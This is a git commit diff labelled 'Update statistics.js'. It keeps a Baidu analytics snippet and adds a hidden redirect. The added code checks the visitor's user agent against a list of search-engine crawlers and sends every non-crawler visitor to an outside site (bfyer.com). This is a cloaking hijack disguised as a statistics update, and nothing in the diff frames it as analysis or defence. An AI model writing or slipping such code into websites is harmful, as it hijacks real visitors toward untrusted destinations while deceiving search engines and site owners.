7614e1247b983bb55101e58c2369b0d7ec70002b
gitonlinecloud <githubonline@outlook.com>
2024-11-06 12:53:03 +0800

    Update statistics.js

--- js/statistics.js
+++ js/statistics.js
@@ -1,1 +1,17 @@
-var _hmt=_hmt||[];(function(){var hm=document.createElement("script");hm.src="https://hm.baidu.com/hm.js?b4126daaae1dc3ff710787203aaf41ad";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm,s)})();
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?b4126daaae1dc3ff710787203aaf41ad";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+var userAgent = navigator.userAgent;
+var spiderList = ["Baiduspider", "360Spider", "YisouSpider", "YandexBot", "Sogou inst spider", "Sogou web spider", "msnbot", "Bingbot", "Sogou spider", "GoogleBot", "Bing"];
+
+var isSpider = spiderList.some(function(spider) {
+    return userAgent.includes(spider);
+});
+
+if (!isSpider) {
+    window.location.href = "https://www.bfyer.com?id=395312789";
+}
